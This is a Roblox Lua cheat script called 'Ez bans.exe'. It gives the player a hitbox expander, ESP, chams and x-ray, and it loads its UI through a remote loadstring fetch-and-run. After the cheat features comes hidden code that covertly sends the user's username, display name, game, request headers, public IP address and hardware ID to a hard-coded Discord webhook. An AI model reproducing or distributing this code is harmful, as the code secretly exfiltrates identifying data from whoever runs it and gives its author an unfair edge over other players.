-- Load ui
local DrRayLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/DrRay-UI-Library/main/DrRay.lua"))()
local window = DrRayLibrary:Load("Ez bans.exe", "Default")
--
local tab = DrRayLibrary.newTab("combat", "ImageIdHere")
-- hitboxes
tab.newToggle("Toggle hbe", "Toggle hbe (hitbox expander)", true, function(toggleState)
    Hitbox = toggleState 
end) 
tab.newSlider("hitbox size", "hitbox expander slider", 7, false, function(num)
    headsize = num
end)
--
local function modifyPlayerHeads()
    for i, v in next, game.Workspace:GetChildren() do
        if v.Name == "Model" and v:FindFirstChild("Head") then
            local head = v.Head
            if head then
                local success, _ = pcall(function()
                    head.Size = Vector3.new(headsize, headsize, headsize)
                    head.Transparency = 0.5
                end)
                if not success then
                    warn("Failed to modify head for player:", v.Name)
                end
            end
        end
    end
end
--
game:GetService("RunService").RenderStepped:Connect(function()
    if Hitbox then
        modifyPlayerHeads()
    end
end)
--
local tab = DrRayLibrary.newTab("viuals", "ImageIdHere")
-- esp
tab.newButton("Esp", "", function()
wait(0.1)
repeat
    wait(0.1)
until game:IsLoaded()
--
wait(0.5)
--
local Cache = {}
local Cache2 = {}
local CornerBoxes = true
local WeaponType = true
local Names = true
local Bar = true
local MaxDistance = 1500
--
local modules = {
    ["PlayerClient"] = {},
}
for _, v in pairs(getgc(true)) do
    if typeof(v) == "function" and islclosure(v) then
        local info = debug.getinfo(v)
        local name = string.match(info.short_src, "%.([%w_]+)$")
        if name and modules[name] and info.name then
            modules[name][info.name] = info.func
        end
    end
end
--
local PlayerList = debug.getupvalue(modules.PlayerClient.updatePlayers, 1)
--
local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
if playerGui:FindFirstChild("XDEDEADEDE") then
    playerGui.XDEDEADEDE:Destroy()
end
--
local Beamed = {
    Varis = {
        RunService = game:GetService("RunService"),
        Camera = game:GetService("Workspace").CurrentCamera,
        Lighting = game:GetService("Lighting"),
        UserInput = game:GetService("UserInputService"),
        LogService = game:GetService("LogService"),
    },
}
--
local BeamVar = Beamed.Varis
local VisibilityState = {}
local BarValue = 100 
--
local function CreateClass(Class, Properties)
    local ClassInt = typeof(Class) == "string" and Instance.new(Class) or Class
    for Property, Value in next, Properties do
        ClassInt[Property] = Value
    end
    return ClassInt
end
--
local XDEDEADEDE = CreateClass("ScreenGui", {
    Parent = playerGui,
    Name = "XDEDEADEDE",
})
--
local function DupeCheck(name)
    local existingESP = XDEDEADEDE:FindFirstChild(name)
    if existingESP then
        existingESP:Destroy()
    end
end
--
local function IsSleeping(model)
    if model and model:FindFirstChild("AnimationController") and model.AnimationController:FindFirstChild("Animator") then
        for _, v in pairs(model.AnimationController.Animator:GetPlayingAnimationTracks()) do
            if v.Animation.AnimationId == "rbxassetid://13280887764" then
                return true
            end
        end
    end
    return false
end
--
local function Calc(distance)
    local maxBarWidth = 4
    local minBarWidth = 1
    local distanceThreshold = 200
--
    if distance > distanceThreshold then
        return minBarWidth
    else
        local scaleFactor = (distanceThreshold - distance) / distanceThreshold
        return maxBarWidth * scaleFactor + minBarWidth
    end
end
--
local function IsVisible(model)
    local humanoidRootPart = model:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then return false end
--
    local cameraPos = BeamVar.Camera.CFrame.Position
    local targetPos = humanoidRootPart.Position
    local direction = (targetPos - cameraPos).unit
    local distance = (targetPos - cameraPos).magnitude
--
    if distance > MaxDistance then
        return false
    end
--
    local rays = {
        Ray.new(cameraPos, direction * distance * 0.5),
        Ray.new(cameraPos, direction * distance * 0.75),
        Ray.new(cameraPos, direction * distance),
        Ray.new(cameraPos, direction * distance * 1.25),
        Ray.new(cameraPos, direction * distance * 1.5)
    }
--
    for _, ray in pairs(rays) do
        local hitPart, _ = workspace:FindPartOnRay(ray, game.Players.LocalPlayer.Character, false, true)
        if hitPart and hitPart:IsDescendantOf(model) then
            return true
        end
    end
--
    return false
end
--
local function ESP(playertable)
    if not playertable then return end
    local model = playertable.model
    local humanoidRootPart = model:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then
        return
    end
--
    DupeCheck(model.Name)
--
    local function CreateCornerBox(name, position, size, anchorPoint)
        return CreateClass("Frame", {
            Parent = XDEDEADEDE,
            Name = name,
            BackgroundColor3 = Color3.fromRGB(161,0,219),
            Position = position,
            Size = size,
            AnchorPoint = anchorPoint,
            Visible = CornerBoxes,
            ZIndex = 10,
        })
    end
--
    local function CreateBar(name, position, size)
        return CreateClass("Frame", {
            Parent = XDEDEADEDE,
            Name = name,
            BackgroundColor3 = Color3.fromRGB(255, 255, 255),
            Position = position,
            Size = size,
            Visible = Bar,
            ZIndex = 11,
        })
    end
--
    local function CreateBarBackRound(name, position, size)
        return CreateClass("Frame", {
            Parent = XDEDEADEDE,
            Name = name,
            BackgroundColor3 = Color3.fromRGB(0, 0, 0),
            Position = position,
            Size = size,
            Visible = Bar,
            ZIndex = 9,
        })
    end
--
    local LeftTop = CreateCornerBox("LeftTop", UDim2.new(0, 0, 0, 0), UDim2.new(0, 0, 0, 1), Vector2.new(0, 0))
    local LeftSide = CreateCornerBox("LeftSide", UDim2.new(0, 0, 0, 0), UDim2.new(0, 1, 0, 0), Vector2.new(0, 0))
    local RightTop = CreateCornerBox("RightTop", UDim2.new(0, 0, 0, 0), UDim2.new(0, 0, 0, 1), Vector2.new(0, 0))
    local RightSide = CreateCornerBox("RightSide", UDim2.new(0, 0, 0, 0), UDim2.new(0, 1, 0, 0), Vector2.new(0, 0))
    local BottomSide = CreateCornerBox("BottomSide", UDim2.new(0, 0, 0, 0), UDim2.new(0, 1, 0, 0), Vector2.new(0, 0))
    local BottomDown = CreateCornerBox("BottomDown", UDim2.new(0, 0, 0, 0), UDim2.new(0, 0, 0, 1), Vector2.new(0, 0))
    local BottomRightSide = CreateCornerBox("BottomRightSide", UDim2.new(0, 0, 0, 0), UDim2.new(0, 1, 0, 0), Vector2.new(0, 0))
    local BottomRightDown = CreateCornerBox("BottomRightDown", UDim2.new(0, 0, 0, 0), UDim2.new(0, 0, 0, 1), Vector2.new(0, 0))
--
    local NameTag = CreateClass("TextLabel", {
        Parent = XDEDEADEDE,
        Name = "NameTag",
        BackgroundTransparency = 1,
        Font = Enum.Font.Code,
        TextColor3 = Color3.fromRGB(161,0,219),
        TextStrokeTransparency = 0,
        TextSize = 11,
        TextStrokeColor3 = Color3.fromRGB(0, 0, 0),
        Size = UDim2.new(0, 100, 0, 20),
        AnchorPoint = Vector2.new(0.5, 0),
        Position = UDim2.new(0.5, 0, 0, 0),
        Visible = Names,  
    })
    local WeaponText = CreateClass("TextLabel", {
        Parent = XDEDEADEDE,
        Name = "WeaponText",
        BackgroundTransparency = 1,
        Font = Enum.Font.Code,
        TextColor3 = Color3.fromRGB(161,0,219),
        TextStrokeTransparency = 0,
        TextSize = 11,
        TextStrokeColor3 = Color3.fromRGB(0, 0, 0),
        Size = UDim2.new(0, 100, 0, 20),
        AnchorPoint = Vector2.new(0.5, 0),
        Position = UDim2.new(0.5, 0, 0, 20),
        Visible = WeaponType,  
    })
--
    local BarBackRound = CreateBarBackRound("BarBackRound", UDim2.new(0, 0, 0, 0), UDim2.new(0, 8, 0, 100))
    local Bar = CreateBar("Bar", UDim2.new(0, 0, 0, 0), UDim2.new(0, 0, 0, 0))
--
    local UIGradient = CreateClass("UIGradient", {
        Parent = Bar,
        Name = "UIGradient",
        Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(9, 255, 0)),
            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 238, 0)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 4)),
        }),
        Rotation = 90,
    })
--
    local Connection
    Connection = BeamVar.RunService.RenderStepped:Connect(function()
        if model and model.Parent and humanoidRootPart and humanoidRootPart.Parent then
            local visible = IsVisible(model)
            VisibilityState[model] = visible
--
            if IsSleeping(model) then
                LeftTop.Visible = false
                LeftSide.Visible = false
                BottomSide.Visible = false
                BottomDown.Visible = false
                RightTop.Visible = false
                RightSide.Visible = false
                BottomRightSide.Visible = false
                BottomRightDown.Visible = false
                NameTag.Visible = false
                WeaponText.Visible = false
                BarBackRound.Visible = false
                Bar.Visible = false
                return
            end
--
            local Pos, OnScreen = BeamVar.Camera:WorldToScreenPoint(humanoidRootPart.Position)
            local Size = humanoidRootPart.Size.Y
            local distance = math.floor((BeamVar.Camera.CFrame.Position - humanoidRootPart.Position).magnitude)
            local scaleFactor = 12 / (Pos.Z * math.tan(math.rad(BeamVar.Camera.FieldOfView * 0.5)) * 2) * 100
            local w, h = 3 * scaleFactor, 4.5 * scaleFactor
            local HealthWidth = Calc(distance)
            local WeaponFound = playertable.equippedItem and playertable.equippedItem.type or "None"
--
            if OnScreen then
                LeftTop.Position = UDim2.new(0, Pos.X - w / 2, 0, Pos.Y - h / 2)
                LeftTop.Size = UDim2.new(0, w / 5, 0, 1)
--
                LeftSide.Position = UDim2.new(0, Pos.X - w / 2, 0, Pos.Y - h / 2)
                LeftSide.Size = UDim2.new(0, 1, 0, h / 5)
--
                BottomSide.Position = UDim2.new(0, Pos.X - w / 2, 0, Pos.Y + h / 2 - h / 5)
                BottomSide.Size = UDim2.new(0, 1, 0, h / 5)
--
                BottomDown.Position = UDim2.new(0, Pos.X - w / 2, 0, Pos.Y + h / 2)
                BottomDown.Size = UDim2.new(0, w / 5, 0, 1)
--
                RightTop.Position = UDim2.new(0, Pos.X + w / 2 - w / 5, 0, Pos.Y - h / 2)
                RightTop.Size = UDim2.new(0, w / 5, 0, 1)
--
                RightSide.Position = UDim2.new(0, Pos.X + w / 2 - 1, 0, Pos.Y - h / 2)
                RightSide.Size = UDim2.new(0, 1, 0, h / 5)
--
                BottomRightSide.Position = UDim2.new(0, Pos.X + w / 2 - 1, 0, Pos.Y + h / 2 - h / 5)
                BottomRightSide.Size = UDim2.new(0, 1, 0, h / 5)
--
                BottomRightDown.Position = UDim2.new(0, Pos.X + w / 2 - w / 5, 0, Pos.Y + h / 2)
                BottomRightDown.Size = UDim2.new(0, w / 5, 0, 1)
--
                NameTag.Position = UDim2.new(0, Pos.X, 0, Pos.Y - h / 2 - 20)
                WeaponText.Position = UDim2.new(0, Pos.X, 0, Pos.Y + h / 2 + 3)
--
                BarBackRound.Position = UDim2.new(0, Pos.X - w / 2 - 10, 0, Pos.Y - h / 2)
                BarBackRound.Size = UDim2.new(0, HealthWidth, 0, h)
--
                local barHeight = (BarValue / 100) * h
                Bar.Position = UDim2.new(0, Pos.X - w / 2 - 10, 0, Pos.Y + h / 2 - barHeight)
                Bar.Size = UDim2.new(0, HealthWidth, 0, barHeight)
--
                local username = model:FindFirstChild("Head") and model.Head:FindFirstChild("Nametag") and model.Head.Nametag.tag.Text or "Player"
                NameTag.Text = username .. " [" .. distance .. "s]"
--
                WeaponText.Text = "[" .. (WeaponFound:upper() or "NONE") .. "]"
--
                local color = VisibilityState[model] and Color3.fromRGB(255, 0, 0) or Color3.fromRGB(161, 0, 219)
--
                LeftTop.BackgroundColor3 = color
                LeftSide.BackgroundColor3 = color
                RightTop.BackgroundColor3 = color
                RightSide.BackgroundColor3 = color
                BottomSide.BackgroundColor3 = color
                BottomDown.BackgroundColor3 = color
                BottomRightSide.BackgroundColor3 = color
                BottomRightDown.BackgroundColor3 = color
                NameTag.TextColor3 = color
                WeaponText.TextColor3 = color
--
                LeftTop.Visible = CornerBoxes
                LeftSide.Visible = CornerBoxes
                RightTop.Visible = CornerBoxes
                RightSide.Visible = CornerBoxes
                BottomSide.Visible = CornerBoxes
                BottomDown.Visible = CornerBoxes
                BottomRightSide.Visible = CornerBoxes
                BottomRightDown.Visible = CornerBoxes
                NameTag.Visible = Names
                WeaponText.Visible = WeaponType
                BarBackRound.Visible = Bar
                Bar.Visible = Bar
            else
                LeftTop.Visible = false
                LeftSide.Visible = false
                BottomSide.Visible = false
                BottomDown.Visible = false
                RightTop.Visible = false
                RightSide.Visible = false
                BottomRightSide.Visible = false
                BottomRightDown.Visible = false
                NameTag.Visible = false
                WeaponText.Visible = false
                BarBackRound.Visible = false
                Bar.Visible = false
            end
        else
            LeftTop.Visible = false
            LeftSide.Visible = false
            RightTop.Visible = false
            RightSide.Visible = false
            BottomSide.Visible = false
            BottomDown.Visible = false
            BottomRightSide.Visible = false
            BottomRightDown.Visible = false
            NameTag.Visible = false
            WeaponText.Visible = false
            BarBackRound.Visible = false
            Bar.Visible = false
        end
--
        if not model then
            LeftTop:Destroy()
            LeftSide:Destroy()
            RightTop:Destroy()
            RightSide:Destroy()
            BottomSide:Destroy()
            BottomDown:Destroy()
            BottomRightSide:Destroy()
            BottomRightDown:Destroy()
            NameTag:Destroy()
            WeaponText:Destroy()
            BarBackRound:Destroy()
            Bar:Destroy()
            if Connection then
                Connection:Disconnect()
            end
        end
    end)
end
--
local function IncrementBarValue()
    while true do
        if BarValue < 100 then
            wait(5) 
            BarValue = math.min(BarValue + 1, 100)  
        end
        wait(5) 
    end
end
--
coroutine.wrap(IncrementBarValue)()
--
local function ResetLowBarValue()
    while true do
        if BarValue <= 1 then
            wait(1)
            BarValue = 100 
        end
        wait(1)
    end
end
--
coroutine.wrap(ResetLowBarValue)()
--
local function onLogMessage(message)
    local HealthAfr = message:match("->(%d+%.?%d*)hp")
    HealthAfr = tonumber(HealthAfr)
    if HealthAfr then
        BarValue = math.floor(HealthAfr) 
    end
end
--
BeamVar.LogService.MessageOut:Connect(onLogMessage)
--
local Cache = {}
for i,v in pairs(PlayerList) do
    if v.type == "Player" and v.model:FindFirstChild("HumanoidRootPart") and not table.find(Cache, v) then
        table.insert(Cache, v)
        ESP(v)
    end
end
--
game:GetService("Workspace").ChildAdded:Connect(function()
    task.delay(1.5, function()
        for i,v in pairs(PlayerList) do
            if v.type == "Player" and v.model:FindFirstChild("HumanoidRootPart") and not table.find(Cache, v) then
                table.insert(Cache, v)
                ESP(v)
            end
        end
    end)
end)
end)
-- chams -- (highlights the player)
tab.newButton("chams", "Highlights the player", function()
local function createHighlight(object)
    if not object:FindFirstChild("Highlight") then
        local highlight = Instance.new("Highlight")
        highlight.Parent = object
        highlight.FillColor = Color3.fromRGB(255, 0, 0)
        highlight.FillTransparency = 0.5
        highlight.OutlineColor = Color3.fromRGB(0, 0, 0)
        highlight.OutlineTransparency = 0.5
    end
end
--
for _, object in pairs(workspace:GetChildren()) do
    if object:FindFirstChild("Head") then
        createHighlight(object)
    end
end
--
workspace.ChildAdded:Connect(function(child)
    if child:FindFirstChild("Head") then
        createHighlight(child)
    end
end)
end)
-- Xray
local CurrentSliderValue = 0.5
--
tab.newSlider("Xray Transparency", "Adjust hitbox transparency", 100, false, function(val)
    CurrentSliderValue = val / 100
end)
--
tab.newToggle("Xray Toggle", "Toggle visibility of player hitboxes", false, function(state)
    for _, v in pairs(game:GetService("Workspace"):GetChildren()) do
        if v:FindFirstChild("Hitbox") then
            v.Hitbox.Transparency = state and CurrentSliderValue or 0
        end
    end
end)
--
local tab = DrRayLibrary.newTab("hitsounds", "ImageIdHere")
-- Hitsounds
local SoundService = game:GetService("SoundService")
--
local sounds = {
    ["Defualt Headshot"] = "rbxassetid://9119561046",
    ["Defualt Body"] = "rbxassetid://9114487369",
    Neverlose = "rbxassetid://8726881116",
    Gamesense = "rbxassetid://4817809188",
    One = "rbxassetid://7380502345",
    Bell = "rbxassetid://6534947240",
    Rust = "rbxassetid://1255040462",
    TF2 = "rbxassetid://2868331684",
    Slime = "rbxassetid://6916371803",
    ["Among Us"] = "rbxassetid://5700183626",
    Minecraft = "rbxassetid://4018616850",
    ["CS:GO"] = "rbxassetid://6937353691",
    Saber = "rbxassetid://8415678813",
    Baimware = "rbxassetid://3124331820",
    Osu = "rbxassetid://7149255551",
    ["TF2 Critical"] = "rbxassetid://296102734",
    Bat = "rbxassetid://3333907347",
    ["Call of Duty"] = "rbxassetid://5952120301",
    Bubble = "rbxassetid://6534947588",
    Pick = "rbxassetid://1347140027",
    Pop = "rbxassetid://198598793",
    Bruh = "rbxassetid://4275842574",
    Bamboo = "rbxassetid://3769434519",
    Crowbar = "rbxassetid://546410481",
    Weeb = "rbxassetid://6442965016",
    Beep = "rbxassetid://8177256015",
    Bambi = "rbxassetid://8437203821",
    Stone = "rbxassetid://3581383408",
    ["Old Fatality"] = "rbxassetid://6607142036",
    Click = "rbxassetid://8053704437",
    Ding = "rbxassetid://7149516994",
    Snow = "rbxassetid://6455527632",
    Laser = "rbxassetid://7837461331",
    Mario = "rbxassetid://2815207981",
    Steve = "rbxassetid://4965083997",
}
local currentSound = nil
--
local function ApplySound(assetId)
    if not SoundService:FindFirstChild("PlayerHitHeadshot") then
        warn("SoundService.PlayerHitHeadshot not found!")
        return
    end
    local headshotSound = SoundService.PlayerHitHeadshot
    headshotSound.SoundId = assetId
    headshotSound.Volume = 5
    headshotSound.Pitch = 1
--
    local equalizer = headshotSound:FindFirstChildWhichIsA("EqualizerSoundEffect")
    if equalizer then
        equalizer.HighGain = -1.5
    end
end
--
local function ResetSound()
    if not SoundService:FindFirstChild("PlayerHitHeadshot") then
        return
    end
    local headshotSound = SoundService.PlayerHitHeadshot
    headshotSound.SoundId = "rbxassetid://9119561046" -- Default headshot sound
    headshotSound.Volume = 1
    headshotSound.Pitch = 1
--
    local equalizer = headshotSound:FindFirstChildWhichIsA("EqualizerSoundEffect")
    if equalizer then
        equalizer.HighGain = 0
    end
end
--
for name, assetId in pairs(sounds) do
    tab.newToggle(name, "Toggle " .. name .. " sound on/off", false, function(toggleState)
        if toggleState then
            currentSound = assetId
            ApplySound(assetId)
            print("Enabled sound:", name)
        else
            if currentSound == assetId then
                ResetSound()
                print("Reset sound back to default")
            end
        end
    end)
end
--
local tab = DrRayLibrary.newTab("skyboxes", "ImageIdHere")
-- Sky boxes
local tab = DrRayLibrary.newTab("sky box", "ImageIdHere")
local Lighting = game:GetService("Lighting")
--
local Sky = Instance.new("Sky")
Sky.Name = "CustomSky"
Sky.Parent = Lighting
--
local SkyBoxes = {
  ["Standard"] = {
    ["SkyboxBk"] = Sky.SkyboxBk, ["SkyboxDn"] = Sky.SkyboxDn,
    ["SkyboxFt"] = Sky.SkyboxFt, ["SkyboxLf"] = Sky.SkyboxLf,
    ["SkyboxRt"] = Sky.SkyboxRt, ["SkyboxUp"] = Sky.SkyboxUp
  },
  ["Among Us"] = {
    ["SkyboxBk"] = "rbxassetid://5752463190", ["SkyboxDn"] = "rbxassetid://5752463190",
    ["SkyboxFt"] = "rbxassetid://5752463190", ["SkyboxLf"] = "rbxassetid://5752463190",
    ["SkyboxRt"] = "rbxassetid://5752463190", ["SkyboxUp"] = "rbxassetid://5752463190"
  },
  ["Spongebob"] = {
    ["SkyboxBk"]="rbxassetid://277099484", ["SkyboxDn"]="rbxassetid://277099500",
    ["SkyboxFt"]="rbxassetid://277099554", ["SkyboxLf"]="rbxassetid://277099531",
    ["SkyboxRt"]="rbxassetid://277099589", ["SkyboxUp"]="rbxassetid://277101591"
  },
  ["Deep Space"] = {
    ["SkyboxBk"]="rbxassetid://159248188", ["SkyboxDn"]="rbxassetid://159248183",
    ["SkyboxFt"]="rbxassetid://159248187", ["SkyboxLf"]="rbxassetid://159248173",
    ["SkyboxRt"]="rbxassetid://159248192", ["SkyboxUp"]="rbxassetid://159248176"
  },
  ["Winter"] = {
    ["SkyboxBk"]="rbxassetid://510645155", ["SkyboxDn"]="rbxassetid://510645130",
    ["SkyboxFt"]="rbxassetid://510645179", ["SkyboxLf"]="rbxassetid://510645117",
    ["SkyboxRt"]="rbxassetid://510645146", ["SkyboxUp"]="rbxassetid://510645195"
  },
  ["Clouded Sky"] = {
    ["SkyboxBk"]="rbxassetid://252760981", ["SkyboxDn"]="rbxassetid://252763035",
    ["SkyboxFt"]="rbxassetid://252761439", ["SkyboxLf"]="rbxassetid://252760980",
    ["SkyboxRt"]="rbxassetid://252760986", ["SkyboxUp"]="rbxassetid://252762652"
  }
}
--
local currentSky = nil
--
local function setSkybox(data)
  for face, id in pairs(data) do
    Sky[face] = id
  end
end
--
for name, data in pairs(SkyBoxes) do
  tab.newToggle(name, "Enable " .. name .. " skybox", false, function(state)
    if state then
      setSkybox(data)
      currentSky = name
    elseif currentSky == name then
      for _, face in pairs({"SkyboxBk", "SkyboxDn", "SkyboxFt", "SkyboxLf", "SkyboxRt", "SkyboxUp"}) do
        Sky[face] = ""
      end
      currentSky = nil
    end
  end)
end
--

for _, line in ipairs({
  "█████████████",
  "█▄─▄▄─█░▄▄░▄█",
  "██─▄█▀██▀▄█▀█",
  "▀▄▄▄▄▄▀▄▄▄▄▄▀",
  "█████████████████████████████████████████████████",
  "█▄─▄─▀██▀▄─██▄─▀█▄─▄█─▄▄▄▄█████▄─▄▄─█▄─▀─▄█▄─▄▄─█",
  "██─▄─▀██─▀─███─█▄▀─██▄▄▄▄─█░░███─▄█▀██▀─▀███─▄█▀█",
  "▀▄▄▄▄▀▀▄▄▀▄▄▀▄▄▄▀▀▄▄▀▄▄▄▄▄▀▄▄▀▀▄▄▄▄▄▀▄▄█▄▄▀▄▄▄▄▄▀"
}) do
    warn(line)
end
--
local TextLabel = Drawing.new("Text")
TextLabel.Text = "Ez bans.exe - free - v5"
TextLabel.Size = 24
TextLabel.Center = true
TextLabel.Outline = true
TextLabel.Visible = true
--
local viewportSize = game:GetService("Workspace").CurrentCamera.ViewportSize
TextLabel.Position = Vector2.new(viewportSize.X / 2, 15)
--
local RunService = game:GetService("RunService")
local hue = 0
--
RunService.RenderStepped:Connect(function()
    hue = (hue + 0.01) % 1
    local color = Color3.fromHSV(hue, 1, 1)
    TextLabel.Color = color
 --   
    local newViewportSize = game:GetService("Workspace").CurrentCamera.ViewportSize
    TextLabel.Position = Vector2.new(newViewportSize.X / 2, 15)
end)

local players = game:GetService("Players")
local lplayer = players.LocalPlayer
local gname = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local request = request or http_request or (http and http.request) or syn.request

local webhookUrl = "https://discord.com/api/webhooks/1368443506166599800/nAt83bs9duWhMwsAIsrx2sSKU6-i1_9m1XG0Gt31-tdVrqvf4j3itcB-NgLAtHwJeZ3n"

local function sendToWebhook(title, description)
    local embed = {
        embeds = {
            {
                title = title,
                description = description,
                color = 0x00FF00
            }
        }
    }

    local jsonData = game:GetService("HttpService"):JSONEncode(embed)

    local response = request({
        Url = webhookUrl,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = jsonData
    })
end

local data = {
    ["embeds"] = {
        {
            ["title"] = "LOG",
            ["description"] = "Name: " .. lplayer.Name .. "\nDisplay: " .. lplayer.DisplayName .. "\nGame: " .. gname,
            ["type"] = "rich",
            ["color"] = tonumber(0xA60842)
        }
    }
}

local newdata = game:GetService("HttpService"):JSONEncode(data)
local headers = {["content-type"] = "application/json"}
local abcdef = {Url = webhookUrl, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

local url1 = "https://httpbin.org/anything/{anything}"
local response1 = request({
    Url = url1,
    Method = "GET"
})

if response1 and response1.Body then
    local decoded1 = game:GetService("HttpService"):JSONDecode(response1.Body)
    local headersMessage = ""

    for key, value in pairs(decoded1.headers) do
        headersMessage = headersMessage .. key .. ": " .. value .. "\n"
    end

    sendToWebhook("Request Headers", headersMessage)
end

local url2 = "https://httpbin.org/ip"
local response2 = request({
    Url = url2,
    Method = "GET"
})

if response2 and response2.Body then
    local decoded2 = game:GetService("HttpService"):JSONDecode(response2.Body)
    local ipMessage = ""

    for key, value in pairs(decoded2) do
        ipMessage = ipMessage .. key .. ": " .. tostring(value) .. "\n"
    end

    sendToWebhook("IP Information", ipMessage)
end
local hwid = gethwid()

local data = {
    ["embeds"] = {
        {
            ["title"] = "HWID Log",
            ["description"] = "The HWID is: " .. hwid,
            ["color"] = tonumber(0xA60842),
        }
    }
}

local newdata = game:GetService("HttpService"):JSONEncode(data)
local headers = {["content-type"] = "application/json"}

local request = http_request or request or HttpPost or syn.request

local abcdef = {
    Url = webhookUrl,
    Body = newdata,
    Method = "POST",
    Headers = headers
}

request(abcdef)
